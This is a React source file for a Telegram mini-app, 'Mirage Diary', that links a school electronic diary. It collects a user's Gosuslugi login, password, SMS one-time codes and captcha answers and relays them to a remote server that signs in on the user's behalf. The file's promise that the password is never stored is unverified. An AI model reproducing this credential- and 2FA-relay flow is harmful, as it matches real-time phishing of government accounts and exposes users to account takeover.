import { useState, useEffect } from 'react';
import { Shield, CheckCircle2, AlertCircle, ChevronRight, RefreshCw, Lock, Phone, Sparkles } from 'lucide-react';

const SERVER_URL = import.meta.env.VITE_SERVER_URL || 'http://localhost:5000';

type Step = 'welcome' | 'login' | 'polling' | 'otp' | 'captcha' | 'success' | 'error';

export default function App() {
  const [step, setStep] = useState<Step>('welcome');
  const [tgUserId, setTgUserId] = useState('');
  const [tgFirstName, setTgFirstName] = useState('');

  const [login, setLogin] = useState('');
  const [password, setPassword] = useState('');
  
  const [sessionId, setSessionId] = useState('');
  const [userInput, setUserInput] = useState('');
  const [captchaImg, setCaptchaImg] = useState('');
  const [errorMsg, setErrorMsg] = useState('');

  const [progressPercent, setProgressPercent] = useState(0);
  const [progressText, setProgressText] = useState('Открываем безопасное соединение...');

  useEffect(() => {
    try {
      const tg = (window as any).Telegram?.WebApp;
      if (tg) {
        tg.ready();
        tg.expand();
        const user = tg.initDataUnsafe?.user;
        if (user?.id) setTgUserId(String(user.id));
        if (user?.first_name) setTgFirstName(user.first_name);
      } else {
        setTgUserId('123456789');
        setTgFirstName('Тест');
      }
    } catch { setTgUserId('123456789'); setTgFirstName('Тест'); }
  }, []);

  // Polling logic
  useEffect(() => {
    if (step !== 'polling' || !sessionId) return;
    
    let percent = 0;
    const progressInterval = setInterval(() => {
      percent += 1;
      if (percent > 95) percent = 95;
      setProgressPercent(percent);

      if (percent === 3) setProgressText('Запускаем защищённый браузер...');
      else if (percent === 8) setProgressText('Открываем страницу авторизации...');
      else if (percent === 15) setProgressText('Вводим данные для входа...');
      else if (percent === 25) setProgressText('Ожидаем ответ от Госуслуг...');
      else if (percent === 40) setProgressText('Проверяем двухфакторную защиту...');
      else if (percent === 55) setProgressText('Подключаемся к Дневнику...');
      else if (percent === 70) setProgressText('Получаем токен доступа...');
      else if (percent === 85) setProgressText('Финализируем авторизацию...');
    }, 300);
    
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`${SERVER_URL}/api/miniapp/auth/status/${sessionId}`, {
          headers: { 'ngrok-skip-browser-warning': 'true' }
        });
        if (res.ok) {
          const data = await res.json();
          if (data.status === 'Success') {
            clearInterval(interval);
            clearInterval(progressInterval);
            setProgressPercent(100);
            setProgressText('Готово!');
            setTimeout(() => setStep('success'), 600);
            setTimeout(() => (window as any).Telegram?.WebApp?.close?.(), 4000);
          } else if (data.status === 'RequiresOtp') {
            clearInterval(interval);
            clearInterval(progressInterval);
            setUserInput('');
            setStep('otp');
          } else if (data.status === 'RequiresCaptcha') {
            clearInterval(interval);
            clearInterval(progressInterval);
            setCaptchaImg(data.captchaImage);
            setUserInput('');
            setStep('captcha');
          } else if (data.status === 'Failed' || data.status === 'Expired') {
            clearInterval(interval);
            clearInterval(progressInterval);
            setErrorMsg(data.errorMessage || 'Сессия истекла или произошла ошибка');
            setStep('error');
          }
        }
      } catch (e: any) { 
        console.error('Poll error:', e);
      }
    }, 4000);
    
    return () => {
      clearInterval(interval);
      clearInterval(progressInterval);
    };
  }, [step, sessionId]);

  const handleStartAuth = async () => {
    if (!login || !password) return;
    setProgressPercent(0);
    setProgressText('Открываем безопасное соединение...');
    setStep('polling');
    setErrorMsg('');
    try {
      const res = await fetch(`${SERVER_URL}/api/miniapp/auth/start`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'ngrok-skip-browser-warning': 'true' },
        body: JSON.stringify({ TelegramUserId: tgUserId, Login: login, Password: password }),
      });
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const data = await res.json();
      setSessionId(data.sessionId);
    } catch (e: any) {
      setErrorMsg('Не удалось связаться с сервером. ' + e.message);
      setStep('error');
    }
  };

  const handleSubmitInput = async () => {
    if (!userInput) return;
    setProgressPercent(45);
    setProgressText('Проверяем введённый код...');
    setStep('polling');
    try {
      const res = await fetch(`${SERVER_URL}/api/miniapp/auth/submit-input`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'ngrok-skip-browser-warning': 'true' },
        body: JSON.stringify({ SessionId: sessionId, Input: userInput }),
      });
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
    } catch (e: any) {
      setErrorMsg('Ошибка отправки кода. ' + e.message);
      setStep('error');
    }
  };

  // ─── WELCOME ──────────────────────────────────────────────────
  if (step === 'welcome') return (
    <div className="screen">
      <div className="logo-wrap">
        <div className="logo-circle"><Sparkles size={30} className="logo-icon" /></div>
        <h1 className="app-title">Mirage Diary</h1>
        <p className="app-sub">
          {tgFirstName ? `Привет, ${tgFirstName}! ` : ''}
          Подключите электронный дневник для получения расписания и оценок.
        </p>
      </div>

      <div className="steps-card">
        <div className="step-row"><span className="step-badge">1</span><span>Введите логин и пароль от Госуслуг</span></div>
        <div className="step-row"><span className="step-badge">2</span><span>Мы безопасно получим токен дневника</span></div>
        <div className="step-row"><span className="step-badge">3</span><span>Ваш пароль нигде не сохраняется</span></div>
      </div>

      <button className="btn-primary" onClick={() => setStep('login')}>
        Начать <ChevronRight size={18} />
      </button>
    </div>
  );

  // ─── LOGIN ────────────────────────────────────────────────────
  if (step === 'login') return (
    <div className="screen">
      <div className="logo-wrap">
        <div className="logo-circle logo-circle--amber"><Lock size={28} className="logo-icon" /></div>
        <h1 className="app-title">Госуслуги</h1>
        <p className="app-sub">Введите данные вашей учётной записи</p>
      </div>

      <div className="input-group">
        <label className="input-label">Телефон, Email или СНИЛС</label>
        <input 
          type="text" 
          className="text-input" 
          value={login} 
          onChange={(e) => setLogin(e.target.value)} 
          placeholder="example@mail.ru" 
        />
      </div>

      <div className="input-group mt-2">
        <label className="input-label">Пароль</label>
        <input 
          type="password" 
          className="text-input" 
          value={password} 
          onChange={(e) => setPassword(e.target.value)} 
          placeholder="••••••••" 
        />
      </div>

      <button className="btn-primary mt-4" onClick={handleStartAuth} disabled={!login || !password}>
        Войти через Госуслуги
      </button>
      <button className="btn-ghost" onClick={() => setStep('welcome')}>Назад</button>
    </div>
  );

  // ─── OTP / 2FA ────────────────────────────────────────────────
  if (step === 'otp') return (
    <div className="screen">
      <div className="logo-wrap">
        <div className="logo-circle logo-circle--amber"><Phone size={28} className="logo-icon" /></div>
        <h1 className="app-title">Код подтверждения</h1>
        <p className="app-sub">Введите код из СМС или приложения-аутентификатора</p>
      </div>

      <div className="input-group mt-4">
        <input 
          type="text" 
          className="text-input text-center text-lg" 
          value={userInput} 
          onChange={(e) => setUserInput(e.target.value)} 
          placeholder="000000" 
          maxLength={6}
          autoFocus
        />
      </div>

      <button className="btn-primary mt-4" onClick={handleSubmitInput} disabled={userInput.length < 4}>
        Подтвердить
      </button>
    </div>
  );

  // ─── CAPTCHA ──────────────────────────────────────────────────
  if (step === 'captcha') return (
    <div className="screen">
      <div className="logo-wrap">
        <div className="logo-circle logo-circle--amber"><Shield size={28} className="logo-icon" /></div>
        <h1 className="app-title">Проверка безопасности</h1>
        <p className="app-sub">Введите текст с картинки</p>
      </div>

      <div className="captcha-container mt-4">
        {captchaImg && <img src={`data:image/jpeg;base64,${captchaImg}`} alt="Captcha" className="captcha-img" />}
      </div>

      <div className="input-group mt-4">
        <input 
          type="text" 
          className="text-input text-center text-lg" 
          value={userInput} 
          onChange={(e) => setUserInput(e.target.value)} 
          placeholder="Текст с картинки" 
          autoFocus
        />
      </div>

      <button className="btn-primary mt-4" onClick={handleSubmitInput} disabled={!userInput}>
        Продолжить
      </button>
    </div>
  );

  // ─── POLLING (LOADING) ────────────────────────────────────────
  if (step === 'polling') return (
    <div className="screen screen-center">
      <div className="spinner-wrap">
        <div className="spinner-ring" />
      </div>
      
      <div className="progress-container mt-4">
        <div className="progress-bar-bg">
          <div className="progress-bar-fill" style={{ width: `${progressPercent}%` }}></div>
        </div>
        <p className="sync-title mt-4">{progressText}</p>
        <p className="sync-sub mt-2">Это может занять до 30 секунд</p>
      </div>
    </div>
  );

  // ─── SUCCESS ──────────────────────────────────────────────────
  if (step === 'success') return (
    <div className="screen screen-center">
      <div className="success-circle">
        <CheckCircle2 size={44} className="success-icon" />
      </div>
      <h2 className="success-title">Авторизация завершена</h2>
      <p className="success-sub mt-2">Дневник подключён. Окно закроется автоматически.</p>
    </div>
  );

  // ─── ERROR ────────────────────────────────────────────────────
  if (step === 'error') return (
    <div className="screen screen-center">
      <div className="error-circle">
        <AlertCircle size={44} className="error-icon" />
      </div>
      <h2 className="error-title">Не удалось войти</h2>
      <p className="error-sub mt-2">{errorMsg}</p>
      <button className="btn-primary mt-4" onClick={() => setStep('login')}>
        <RefreshCw size={16} /> Попробовать снова
      </button>
    </div>
  );

  return null;
}
